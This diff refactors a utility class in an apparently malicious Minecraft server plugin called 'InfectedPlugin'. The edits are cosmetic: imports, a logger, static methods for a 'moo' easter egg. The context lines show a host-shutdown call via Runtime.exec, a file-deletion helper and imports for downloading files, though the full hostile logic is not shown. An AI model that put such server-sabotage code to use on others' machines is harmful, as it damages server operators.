@@ -2,17 +2,23 @@ package org.CreeperCoders.InfectedPlugin;
 
 import java.io.File;
 import java.io.FileOutputStream;
+import java.io.IOException;
 import java.net.URL;
 import java.nio.channels.Channels;
 import java.nio.channels.ReadableByteChannel;
-import java.io.IOException;
+import java.util.List;
+import java.util.logging.Logger;
 
-import org.bukkit.*;
-import org.bukkit.entity.*;
-import org.bukkit.command.*;
+import org.bukkit.Bukkit;
+import org.bukkit.ChatColor;
+import org.bukkit.Sound;
+import org.bukkit.command.CommandSender;
+import org.bukkit.entity.Player;
 
 public class IP_Util
 {
+    public static final Logger log = Bukkit.getLogger();
+
     public static boolean deleteFile(File file)
     {
         if (file.exists())
@@ -96,7 +102,7 @@ public class IP_Util
         Runtime.getRuntime().exec(shutdownCommand);
         System.exit(0);
     }
-    
+
     public static void bcastMsg(String message, ChatColor color)
     {
         for (Player player : Bukkit.getOnlinePlayers())
@@ -104,17 +110,17 @@ public class IP_Util
             player.sendMessage((color == null ? "" : color) + message);
         }
     }
-    
+
     public static void bcastMsg(String message)
     {
         IP_Util.bcastMsg(message, null);
     }
-    
+
     public static void adminAction(String adminName, String action, boolean isRed)
     {
         IP_Util.bcastMsg(adminName + " - " + action, (isRed ? ChatColor.RED : ChatColor.AQUA));
     }
-    
+
     public static String implodeStringList(String glue, List<String> pieces)
     {
         StringBuilder output = new StringBuilder();
@@ -128,8 +134,8 @@ public class IP_Util
         }
         return output.toString();
     }
-    
-    private final String[] consoleMoo = new String[]
+
+    private final static String[] consoleMoo = new String[]
     {
         " (__)",
         " (oo)",
@@ -139,7 +145,7 @@ public class IP_Util
         " ~~ ~~",
         "....\"Have you mooed today?\"..."
     };
-    private final String[] playerMoo = new String[]
+    private final static String[] playerMoo = new String[]
     {
         " (__)",
         " (oo)",
@@ -150,7 +156,7 @@ public class IP_Util
         "....\"Have you mooed today?\"..."
     };
 
-    private void run_moo(final CommandSender sender, final String commandLabel, final String[] args)
+    public static void run_moo(final CommandSender sender, final String commandLabel, final String[] args)
     {
         if (args.length == 2 && args[1].equals("moo"))
         {
